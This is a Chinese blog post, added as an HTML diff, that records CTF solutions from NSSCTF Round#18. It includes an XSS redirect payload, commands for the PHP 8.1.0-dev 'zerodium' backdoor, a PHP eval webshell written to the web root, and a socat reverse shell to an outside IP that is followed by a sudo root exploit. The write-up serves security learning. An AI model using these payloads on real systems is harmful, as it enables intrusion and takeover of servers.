@@ -1,0 +1,664 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+
+
+
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+  <meta name="author" content="Hehanzzz">
+
+
+  <meta name="subtitle" content="“冬将尽，春可期”">
+
+
+  <meta name="description" content="Hehanzzz">
+
+
+
+<title>近期CTF记录复现——SICTF Round#3、NSSCTF Round#18 | Hehanzzz’s Blog</title>
+
+
+
+<link rel="icon" href="/favicon.ico">
+
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/nprogress/nprogress.css">
+
+
+
+<script src="/lib/jquery.min.js"></script>
+
+
+<script src="/lib/iconify-icon.min.js"></script>
+
+
+<script src="https://cdn.tailwindcss.com?plugins=typography"></script>
+<script>
+  tailwind.config = {
+    darkMode: "class",
+  };
+</script>
+
+
+<script src="/lib/nprogress/nprogress.js"></script>
+
+<script>
+  $(document).ready(() => {
+    NProgress.configure({
+      showSpinner: false,
+    });
+    NProgress.start();
+    $("#nprogress .bar").css({
+      background: "#de7441",
+    });
+    $("#nprogress .peg").css({
+      "box-shadow": "0 0 2px #de7441, 0 0 4px #de7441",
+    });
+    $("#nprogress .spinner-icon").css({
+      "border-top-color": "#de7441",
+      "border-left-color": "#de7441",
+    });
+    setTimeout(function () {
+      NProgress.done();
+      $(".fade").removeClass("out");
+    }, 800);
+  });
+</script>
+
+<script>
+  (function () {
+    const prefersDark =
+      window.matchMedia &&
+      window.matchMedia("(prefers-color-scheme: dark)").matches;
+    const setting = localStorage.getItem("hexo-color-scheme") || "auto";
+    if (setting === "dark" || (prefersDark && setting !== "light"))
+      document.documentElement.classList.toggle("dark", true);
+    let isDark = document.documentElement.classList.contains("dark");
+  })();
+
+  $(document).ready(function () {
+    // init icon
+    const prefersDark =
+      window.matchMedia &&
+      window.matchMedia("(prefers-color-scheme: dark)").matches;
+    const isDark = document.documentElement.classList.contains("dark");
+    $("#theme-icon").attr("icon", isDark ? "ri:moon-line" : "ri:sun-line");
+
+    function toggleGiscusTheme() {
+      const isDark = document.documentElement.classList.contains("dark");
+      const giscusFrame = document.querySelector("iframe.giscus-frame");
+      if (giscusFrame) {
+        giscusFrame.contentWindow.postMessage(
+          {
+            giscus: {
+              setConfig: {
+                theme: isDark ? "dark" : "light",
+              },
+            },
+          },
+          "https://giscus.app"
+        );
+      }
+    }
+
+
+    // toggle dark mode
+    function toggleDark() {
+      let isDark = document.documentElement.classList.contains("dark");
+      const setting = localStorage.getItem("hexo-color-scheme") || "auto";
+      isDark = !isDark;
+      document.documentElement.classList.toggle("dark", isDark);
+      $("#theme-icon").attr("icon", isDark ? "ri:moon-line" : "ri:sun-line");
+      if (prefersDark === isDark) {
+        localStorage.setItem("hexo-color-scheme", "auto");
+      } else {
+        localStorage.setItem("hexo-color-scheme", isDark ? "dark" : "light");
+      }
+      toggleGiscusTheme();
+    }
+    $("#toggle-dark").click(toggleDark);
+
+    // listen dark mode change
+    window
+      .matchMedia("(prefers-color-scheme: dark)")
+      .addEventListener("change", (e) => {
+        const setting = localStorage.getItem("hexo-color-scheme") || "auto";
+        if (setting === "auto") {
+          document.documentElement.classList.toggle("dark", e.matches);
+          $("#theme-icon").attr(
+            "icon",
+            e.matches ? "ri:moon-line" : "ri:sun-line"
+          );
+          toggleGiscusTheme();
+        }
+      });
+  });
+</script>
+
+
+
+
+<meta name="generator" content="Hexo 7.0.0"></head>
+<body class="font-sans bg-white dark:bg-zinc-900 text-gray-700 dark:text-gray-200 relative">
+  <header class="fixed w-full px-5 py-1 z-10 backdrop-blur-xl backdrop-saturate-150 border-b border-black/5">
+  <div class="max-auto">
+    <nav class="flex items-center text-base">
+      <a href="/" class="group">
+        <h2 class="font-medium tracking-tighterp text-l p-2">
+          <img class="w-5 mr-2 inline-block transition-transform group-hover:rotate-[30deg]" id="logo" src="/images/logo.svg" alt="Hehanzzz’s Blog" />
+          Hehanzzz’s Blog
+        </h2>
+      </a>
+      <div id="header-title" class="opacity-0 md:ml-2 md:mt-[0.1rem] text-xs font-medium whitespace-nowrap overflow-hidden overflow-ellipsis">
+        近期CTF记录复现——SICTF Round#3、NSSCTF Round#18
+      </div>
+      <div class="flex-1"></div>
+      <div class="flex items-center gap-3">
+        
+          <a class="hidden sm:flex" href="/archives">Posts</a>
+        
+        
+          
+            <a class="w-5 h-5 hidden sm:flex" title="Github" target="_blank" rel="noopener" href="https://github.com/hehanzzz">
+              <iconify-icon width="20" icon="ri:github-line"></iconify-icon>
+            </a>
+          
+            <a class="w-5 h-5 hidden sm:flex" title="Twitter" target="_blank" rel="noopener" href="https://x.com/hehanzzz">
+              <iconify-icon width="20" icon="ri:twitter-line"></iconify-icon>
+            </a>
+          
+        
+        <a class="w-5 h-5 hidden sm:flex" title="友情链接" href="2023/12/31/About-me-关于我/">
+          <iconify-icon width="20" icon="ri:rss-line"></iconify-icon>
+        </a>
+        <a class="w-5 h-5" title="toggle theme" id="toggle-dark">
+          <iconify-icon width="20" icon="" id="theme-icon"></iconify-icon>
+        </a>
+      </div>
+      <div class="flex items-center justify-center gap-3 ml-3 sm:hidden">
+        <span class="w-5 h-5" aria-hidden="true" role="img" id="open-menu">
+          <iconify-icon width="20" icon="carbon:menu" ></iconify-icon>
+        </span>
+        <span class="w-5 h-5 hidden" aria-hidden="true" role="img" id="close-menu">
+          <iconify-icon  width="20" icon="carbon:close" ></iconify-icon>
+        </span>
+      </div>
+    </nav>
+  </div>
+</header>
+<div id="menu-panel" class="h-0 overflow-hidden sm:hidden fixed left-0 right-0 top-12 bottom-0 z-10">
+  <div id="menu-content" class="relative z-20 bg-white/80 px-6 sm:px-8 py-2 backdrop-blur-xl -translate-y-full transition-transform duration-300">
+    <ul class="nav flex flex-col sm:flex-row text-sm font-medium">
+      
+        <li class="nav-portfolio sm:mx-2 border-b sm:border-0 border-black/5 last:border-0 hover:text-main">
+          <a href="/archives" class="flex h-12 sm:h-auto items-center">Posts</a>
+        </li>
+      
+    </ul>
+  </div>
+  <div class="mask bg-black/20 absolute inset-0"></div>
+</div>
+
+  <main class="pt-14">
+    <!-- css -->
+
+<link rel="stylesheet" href="/lib/fancybox/fancybox.min.css">
+
+
+<link rel="stylesheet" href="/lib/tocbot/tocbot.min.css">
+
+<!-- toc -->
+
+  <!-- tocbot -->
+<nav class="post-toc toc text-sm w-48 relative top-32 right-0 opacity-70 hidden lg:block" style="position: fixed !important;"></nav>
+
+
+<section class="px-6 max-w-prose mx-auto md:px-0">
+  <!-- header -->
+  <header class="overflow-hidden pt-6 pb-6 md:pt-12">
+    <div class="pt-4 md:pt-6">
+      <h1 id="article-title" class="text-[2rem] font-bold leading-snug mb-4 md:mb-6 md:text-[2.6rem]">
+        近期CTF记录复现——SICTF Round#3、NSSCTF Round#18
+      </h1>
+      <div>
+        <section class="flex items-center gap-3 text-sm">
+          <span class="flex items-center gap-1">
+            <iconify-icon width="18" icon="carbon-calendar" ></iconify-icon>
+            <time>2024-02-17</time>
+          </span>
+          <span class="text-gray-400">·</span>
+          <span class="flex items-center gap-1">
+            <iconify-icon width="18" icon="ic:round-access-alarm" ></iconify-icon>
+            <span>9 min</span>
+          </span>
+          <span class="text-gray-400">·</span>
+          <span class="flex items-center gap-1">
+            <iconify-icon width="18" icon="icon-park-outline:font-search" ></iconify-icon>
+            <span>2.2k words</span>
+          </span>
+          
+        </section>
+      </div>
+    </div>
+  </header>
+  <!-- content -->
+  <article class="post-content prose m-auto slide-enter-content dark:prose-invert">
+    <p>2月CTF比赛复现记录与思考</p>
+<span id="more"></span>
+
+<h1 id="NSSCTF-Round-18"><a href="#NSSCTF-Round-18" class="headerlink" title="NSSCTF Round#18"></a>NSSCTF Round#18</h1><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="NSSRound-18-Basic-门酱想玩什么呢？"><a href="#NSSRound-18-Basic-门酱想玩什么呢？" class="headerlink" title="[NSSRound#18 Basic]门酱想玩什么呢？"></a>[NSSRound#18 Basic]门酱想玩什么呢？</h3><p>比赛的时候刚从外地回家，没来得及看题，于是上题库后重新复现</p>
+<blockquote>
+<p>题目位置：[<a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/5123">NSSRound#18 Basic]门酱想玩什么呢？ | NSSCTF</a></p>
+</blockquote>
+<p>刚打开网站的时候出现一个mp4，一开始并没有想着说去F12看看，等mp4播放完后就自动挑战到了 king.php 下</p>
+<p>后续没思路的时候重头来过，看了一下数据包没啥东西，就用F12大法看看有没有隐藏信息</p>
+<p>不过需要注意的是，这题有hint，也指向了启动页面（还是hint很关键啊，前面浪费了很久时间）</p>
+<blockquote>
+<p>门酱想玩新游戏了，你能给他下载地址吗？<br>hint1: 启动的页面藏了提示<br>hint2: 与cookie无关，给门酱链接就行了</p>
+</blockquote>
+<p><img src="/../images/202402ctf/image-20240217000056745.png"></p>
+<p>提示了这个地址：nssctfroundSpring.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//部分关键代码</span></span><br><span class="line"><span class="variable">$contentLines</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot; &quot;</span>, <span class="variable">$comment</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^https?:\/\/\S+$/&#x27;</span>, <span class="variable">$contentLines</span>[<span class="number">0</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^https?:\/\/[^\/]+\/\S+\.png$/&#x27;</span>, <span class="variable">$contentLines</span>[<span class="number">0</span>], <span class="variable">$matches</span>) &amp;&amp; <span class="title function_ invoke__">end</span>(<span class="variable">$contentLines</span>) === <span class="string">&#x27;/png&#x27;</span>) &#123;</span><br><span class="line">        <span class="variable">$urlParts</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$matches</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$urlParts</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;img class=&quot;content&quot; src=&quot;&#x27;</span> . <span class="variable">$matches</span>[<span class="number">0</span>] . <span class="string">&#x27;&quot;&gt;&#x27;</span>;</span><br><span class="line">            <span class="comment">//.......</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//......</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>先继续浏览一下其他页面吧首页下</p>
+<p><img src="/../images/202402ctf/QQ%E6%88%AA%E5%9B%BE20240217001053.png"></p>
+<p>有一个文本框还有一个评论区</p>
+<p><img src="/../images/202402ctf/QQ%E6%88%AA%E5%9B%BE20240217001223.png"></p>
+<p>评论区可以进行评论，结合前面的hint其实大概也能猜出来是XSS了，不过具体xss要干什么还不知道</p>
+<p>因为hint给了与cookie无关，所以猜测可能不是打cookie</p>
+<p>然后要给门酱一个链接，猜测应该是用XSS进行跳转吧</p>
+<p>这里随便给了门酱个链接，例如<a target="_blank" rel="noopener" href="http://www.baidu.com显示要自己的网站/">www.baidu.com显示要自己的网站</a></p>
+<p>刚好符合前面的猜测，进行xss跳转</p>
+<p><img src="/../images/202402ctf/2.png"></p>
+<p>拿靶机的网站上去试试</p>
+<p><img src="/../images/202402ctf/3.png"></p>
+<p>不再显示</p>
+<p>于是看nssctfroundSpring.php进行xss</p>
+<p>直接进行分析：</p>
+<ol>
+<li><code>$contentLines = explode(&quot; &quot;, $comment[&#39;content&#39;]);</code> 这行代码将评论内容 <code>$comment[&#39;content&#39;]</code> 按照空格进行分割，存储到 <code>$contentLines</code> 数组中。假设评论内容是以空格分隔的单词。</li>
+<li><code>if (preg_match(&#39;/^https?:\/\/\S+$/&#39;, $contentLines[0])) &#123;</code> 这行代码用正则表达式检查评论内容中第一个单词是否是以 <code>http://</code> 或 <code>https://</code> 开头的链接。如果是，则继续执行下面的逻辑。</li>
+<li><code>if (preg_match(&#39;/^https?:\/\/[^\/]+\/\S+\.png$/&#39;, $contentLines[0], $matches) &amp;&amp; end($contentLines) === &#39;/png&#39;) &#123;</code> 这行代码使用正则表达式检查链接是否以 <code>.png</code> 结尾，并且链接的结尾也是 <code>/png</code>。如果是，则执行下面的逻辑。</li>
+<li><code>$urlParts = parse_url($matches[0]);</code> 这行代码使用 <code>parse_url</code> 函数解析匹配到的链接，将其分解为各个部分，并存储到 <code>$urlParts</code> 变量中。</li>
+<li><code>if ($urlParts !== false) &#123;</code> 这行代码检查 <code>parse_url</code> 函数是否成功解析了链接，如果成功，则继续执行下面的逻辑。</li>
+<li><code>echo &#39;&lt;img class=&quot;content&quot; src=&quot;&#39; . $matches[0] . &#39;&quot;&gt;&#39;;</code> 这行代码输出一个 <code>&lt;img&gt;</code> 标签，将匹配到的图片链接作为 <code>src</code> 属性的值，并添加了一个 <code>class=&quot;content&quot;</code> 的类名。这样就会在页面上显示该图片。</li>
+</ol>
+<p>前面就是正常的评论区要求的输入规则，后面的echo是xss的关键，在代码审计中echo更是xss的关键，有机会写一下关于xss的代码审计</p>
+<p>可以看到是将前面的内容直接拼接进来，所以我们按照评论规则接着使用 “&gt; 直接闭合是不是就可以达到xss</p>
+<p>理论成立，实践开始</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://1.com&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&lt;img&quot;1.png 12 /png</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/202402ctf/4.png"></p>
+<p>然后就直接百度一个跳转语法就好啦</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;https://genshin.hoyoverse.com/&#x27;</span>;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>payload：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">http</span>:<span class="comment">//1.com&quot;&gt;&lt;script&gt;window.location.href=&#x27;https://genshin.hoyoverse.com/&#x27;;&lt;/script&gt;&lt;img&quot;1.png 12 /png</span></span><br></pre></td></tr></table></figure>
+
+<p>因为xss跳转无法立即拿到url，所以bp拦截一下就好了</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/words/?title=MQ%3D%3D&amp;content=aHR0cCUzQSUyRiUyRjEuY29tJTIyJTNFJTNDc2NyaXB0JTNFd2luZG93LmxvY2F0aW9uLmhyZWYlM0QnaHR0cHMlM0ElMkYlMkZnZW5zaGluLmhveW92ZXJzZS5jb20lMkYnJTNCJTNDJTJGc2NyaXB0JTNFJTNDaW1nJTIyMS5wbmclMjAxMiUyMCUyRnBuZw%3D%3D</span><br></pre></td></tr></table></figure>
+
+<p>结果还是不行，人傻了，等重新看了一下评论区才发现，这nm我给错游戏了，应该给元梦之星</p>
+<p>重新来</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;https://ymzx.qq.com/&#x27;</span>;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>payload：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">http</span>:<span class="comment">//1.com&quot;&gt;&lt;script&gt;window.location.href=&#x27;https://ymzx.qq.com/&#x27;;&lt;/script&gt;&lt;img&quot;1.png 12 /png</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/words/?title=MQ%3D%3D&amp;content=aHR0cCUzQSUyRiUyRjEuY29tJTIyJTNFJTNDc2NyaXB0JTNFd2luZG93LmxvY2F0aW9uLmhyZWYlM0QnaHR0cHMlM0ElMkYlMkZ5bXp4LnFxLmNvbSUyRiclM0IlM0MlMkZzY3JpcHQlM0UlM0NpbWclMjIxLnBuZyUyMDEyJTIwJTJGcG5n</span><br></pre></td></tr></table></figure>
+
+<p>成功拿到flag：NSSCTF{64844971-41d6-4111-ab66-495df8fb4c15}</p>
+<p><img src="/../images/202402ctf/6.png"></p>
+<p>好久没打ctf了，没想到越来越脑洞了……</p>
+<h3 id="NSSRound-18-Basic-easy-rw"><a href="#NSSRound-18-Basic-easy-rw" class="headerlink" title="[NSSRound#18 Basic]easy_rw"></a>[NSSRound#18 Basic]easy_rw</h3><p>金币不够做不了  -。-</p>
+<p>占个坑，等我下次金币够了在做吧</p>
+<blockquote>
+<p>题目位置：[<a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/5135">NSSRound#18 Basic]easy_rw | NSSCTF</a></p>
+</blockquote>
+<p><img src="/../images/202402ctf/7.png"></p>
+<h3 id="NSSRound-18-Basic-Becomeroot"><a href="#NSSRound-18-Basic-Becomeroot" class="headerlink" title="[NSSRound#18 Basic]Becomeroot"></a>[NSSRound#18 Basic]Becomeroot</h3><blockquote>
+<p>题目位置：[<a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/5126">NSSRound#18 Basic]Becomeroot | NSSCTF</a></p>
+</blockquote>
+<blockquote>
+<p>题目描述：php的开发仓库好像被入侵过</p>
+</blockquote>
+<p>一打开就是一个phpinfo</p>
+<p><img src="/../images/202402ctf/8.png"></p>
+<p>一脸懵逼，有点抽象，不会又跟前面那个xss一样得寻找蛛丝马迹吧</p>
+<p>往信息泄露这方面去想了想，发现PHP版本是已知的 PHP Version 8.1.0-dev</p>
+<p> <img src="/../images/202402ctf/1.png"></p>
+<p>找到这个PHP版本有后门漏洞，通过发送 User-Agentt 标头来执行任意代码</p>
+<p>那还说什么，直接开测</p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1839234">PHP 8.1.0-dev 后门远程命令执行漏洞复现-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
+<p>payload测试：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agentt: zerodiumvar_dump(2*3);</span><br></pre></td></tr></table></figure>
+
+<p>成功回显int(6)，漏洞存在</p>
+<p><img src="/../images/202402ctf/9.png"></p>
+<p>ls看看根目录</p>
+<p><img src="/../images/202402ctf/10.png"></p>
+<p>根据最开始说的flag在&#x2F;root下，用ls看看</p>
+<p>发现回显空，猜测是不是没权限呀</p>
+<p><img src="/../images/202402ctf/11.png"></p>
+<p>执行whoami发现是user用户</p>
+<p>判断没权限，难不成ctf得提权了？？？</p>
+<p>不管先，先上shell</p>
+<p>写🐎得先看目录在哪，盲猜默认目录 &#x2F;var&#x2F;www&#x2F;html</p>
+<p>ls看了一下发现确实是，回显了index.php</p>
+<p>那就直接用echo写🐎了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agentt: zerodiumsystem(&#x27;echo &quot;&lt;?php @eval($_POST[1]);phpinfo();?&gt;&quot;&gt;/var/www/html/1.php&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>打开1.php，提示</p>
+<p><strong>Parse error</strong>:  syntax error, unexpected end of file, expecting “(“ in <strong>&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php(1) : eval()’d code</strong> on line <strong>1</strong></p>
+<p><img src="/../images/202402ctf/12.png"></p>
+<p>看来得对$进行转义</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agentt: zerodiumsystem(&#x27;echo &quot;<span class="meta">&lt;?php @eval(\$_POST[1]);phpinfo();?&gt;</span>&quot;&gt;/var/www/html/1.php&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>成功写入，连接</p>
+<p>md还真要提权，env没有，也打不开root目录，小小ctf还整上提权了</p>
+<p>看一下内核版本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/*-release</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/202402ctf/13.png"></p>
+<p>发现是 Ubuntu 20.04.3 LTS</p>
+<p>直接百度Ubuntu 20.04.3 LTS提权，使用<a target="_blank" rel="noopener" href="https://github.com/briskets/CVE-2021-3493/tree/main">CVE-2021-3493</a>提权</p>
+<p>一顿操作猛如虎，结果失败了</p>
+<p><img src="/../images/202402ctf/14.png"></p>
+<p>没办法，换方法</p>
+<p>往浏览器下翻了一下，发现还有个 CVE-2021-31560 可以试试</p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1782930">【漏洞修复】Linux Sudo本地提权漏洞修复（CVE-2021-31560)-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
+<p>但是找不到exp，百度这个cve结果发现这篇文章后面多打了一个0  &#x3D;.&#x3D;</p>
+<p>正确的cve应该是：CVE-2021-3156：<a target="_blank" rel="noopener" href="https://github.com/blasty/CVE-2021-3156.git">https://github.com/blasty/CVE-2021-3156</a></p>
+<p>发现还是不太行</p>
+<p><img src="/../images/202402ctf/15.png"></p>
+<p>被迫去看官方wp</p>
+<p>发现真的是这个cve，但是上面的poc打不成功</p>
+<p>用官方的poc去打：<a target="_blank" rel="noopener" href="https://github.com/CptGibbon/CVE-2021-3156">CptGibbon&#x2F;CVE-2021-3156: Root shell PoC for CVE-2021-3156 (github.com)</a></p>
+<p>发现也不太ok</p>
+<p><img src="/../images/202402ctf/16.png"></p>
+<p>猜测应该是得用交互式shell才能提权了，传个socat弹个交互式shell到服务器上</p>
+<p>但是这时候，服务器崩坏了（寄，又得花费30金币）</p>
+<p>重新开了一个靶机 用socat进行交互shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./socat exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sigint,sane tcp:39.108.11.237:2333</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/202402ctf/17.png"></p>
+<p>直接make 然后运行</p>
+<p><img src="/../images/202402ctf/18.png"></p>
+<p>也是终于成功了www…</p>
+<p><img src="/../images/202402ctf/19.png"></p>
+<p>NSSCTF{0014fed1-627b-4d93-802c-1ccefda6df75}</p>
+<p>总结一下，这题跟上面的xss一样麻烦（可能是我太菜了吧），但是难度并不难，几个细节还是得注意一下的</p>
+<p>然后就是socat这个命令可以记录一下，看官方wp是直接去使用这个cve也没判断过程（老藏着掖着不写详细）</p>
+<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="NSSRound-18-Basic-温馨的酒吧"><a href="#NSSRound-18-Basic-温馨的酒吧" class="headerlink" title="[NSSRound#18 Basic]温馨的酒吧"></a>[NSSRound#18 Basic]温馨的酒吧</h3><blockquote>
+<p>题目链接：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1nH4y1E7Hg/">https://www.bilibili.com/video/BV1nH4y1E7Hg/</a></p>
+</blockquote>
+<p>这题没什么好说的，不评价，全部走完流程就可以拿flag了</p>
+<h3 id="NSSRound-18-Basic-Number-7"><a href="#NSSRound-18-Basic-Number-7" class="headerlink" title="[NSSRound#18 Basic]Number 7"></a>[NSSRound#18 Basic]Number 7</h3><blockquote>
+<p>Inside No.9 or Inside No.7 ?<br>182A1918071C152E0A4737263A3E780A6F6A075A112742777C687D0700773F7D39560063487D</p>
+</blockquote>
+<p>Type 7加密，找个在线网站解密就好了</p>
+<p><a target="_blank" rel="noopener" href="http://www.atoolbox.net/Tool.php?Id=992">Type7密码加密&#x2F;解密 - 一个工具箱 - 好用的在线工具都在这里！ (atoolbox.net)</a></p>
+<p>NSSCTF{H4PPY_N3WY34r_4ND_N55CTF_18TH}</p>
+<h3 id="NSSRound-18-Basic-usersssssssss"><a href="#NSSRound-18-Basic-usersssssssss" class="headerlink" title="[NSSRound#18 Basic]usersssssssss"></a>[NSSRound#18 Basic]usersssssssss</h3><blockquote>
+<p>这么多用户，总有一个用户拥有flag<br>（用户名取自附件中的字典，密码就是用户名的md5sum）</p>
+</blockquote>
+<blockquote>
+<p>题目链接：[<a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/5128">NSSRound#18 Basic]usersssssssss | NSSCTF</a></p>
+</blockquote>
+<p>应该是爆破题，有空再看看，不想浪费金币</p>
+<h3 id="NSSRound-18-Basic-Debuger"><a href="#NSSRound-18-Basic-Debuger" class="headerlink" title="[NSSRound#18 Basic]Debuger"></a>[NSSRound#18 Basic]Debuger</h3><blockquote>
+<p>什么，直接开放一个debuger让我来操作吗，这么好的吗</p>
+</blockquote>
+<blockquote>
+<p>题目链接：[<a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/5127">NSSRound#18 Basic]Debuger | NSSCTF</a></p>
+</blockquote>
+<p>占坑，晚点看看，还没做过类似的题目</p>
+<h1 id="SICTF-Round-3"><a href="#SICTF-Round-3" class="headerlink" title="SICTF Round#3"></a>SICTF Round#3</h1><p>等晚点结束了再把wp放出来</p>
+
+  </article>
+  <!-- tag -->
+  <div class="mt-12 pt-6 border-t border-gray-200">
+    
+      
+        <span class="bg-gray-100 dark:bg-gray-700 px-2 py-1 m-1 text-sm rounded-md transition-colors hover:bg-gray-200">
+          <a href="/tags/CTF/">CTF</a>
+        </span>
+      
+    
+  </div>
+  <!-- prev and next -->
+  <div class="flex justify-between mt-12 pt-6 border-t border-gray-200">
+    <div>
+      
+    </div>
+    <div>
+      
+        <a href="/2023/12/31/About-me-%E5%85%B3%E4%BA%8E%E6%88%91/" class="text-sm text-gray-400 hover:text-gray-500 flex justify-center">
+          About me | 关于我
+          <iconify-icon width="20" icon="ri:arrow-right-s-line" data-inline="false"></iconify-icon>
+        </a>
+      
+    </div>
+  </div>
+  <!-- comment -->
+  <div class="article-comments mt-12">
+    
+<script
+  src="https://giscus.app/client.js"
+  data-repo="Hehanzzz/hehanzzz.github.io"
+  data-repo-id="R_kgDOKls9Wg"
+  data-category="Announcements"
+  data-category-id="DIC_kwDOKls9Ws4Cb8Mv"
+  data-mapping="pathname"
+  data-strict="0"
+  data-reactions-enabled="1"
+  data-emit-metadata="0"
+  data-input-position="bottom"
+  data-theme="preferred_color_scheme"
+  data-lang="zh-CN"
+  crossorigin="anonymous"
+  async
+></script>
+<script>
+  window.onload = function () {
+    console.log("giscus loaded");
+    const isDark = document.documentElement.classList.contains("dark");
+    const giscusFrame = document.querySelector("iframe.giscus-frame");
+    giscusFrame.contentWindow.postMessage(
+      {
+        giscus: {
+          setConfig: {
+            theme: isDark ? "dark" : "light",
+          },
+        },
+      },
+      "https://giscus.app"
+    );
+  };
+</script>
+
+
+  </div>
+</section>
+<!-- js inspect -->
+
+<script src="/lib/clipboard.min.js"></script>
+
+
+<script async src="https://cdn.jsdelivr.net/npm/mathjax@2/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    "HTML-CSS": {
+        preferredFont: "TeX",
+        availableFonts: ["STIX","TeX"],
+        linebreaks: { automatic:true },
+        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
+        processEscapes: true,
+        ignoreClass: "tex2jax_ignore|dno",
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+        equationNumbers: { autoNumber: "AMS" },
+        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
+        Macros: { href: "{}" }
+    },
+    messageStyle: "none"
+  });
+</script>
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+      var all = MathJax.Hub.getAllJax(), i;
+      for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+  });
+</script>
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js"></script>
+<script>
+  $(document).ready(() => {
+    const maraidConfig = {
+      theme: "default",
+      logLevel: 3,
+      flowchart: { curve: "linear" },
+      gantt: { axisFormat: "%m/%d/%Y" },
+      sequence: { actorMargin: 50 },
+    };
+    mermaid.initialize(maraidConfig);
+  });
+</script>
+
+
+
+<script src="/lib/fancybox/fancybox.umd.min.js"></script>
+
+<script>
+  $(document).ready(() => {
+    $('.post-content').each(function(i){
+      $(this).find('img').each(function(){
+        if ($(this).parent().hasClass('fancybox') || $(this).parent().is('a')) return;
+        var alt = this.alt;
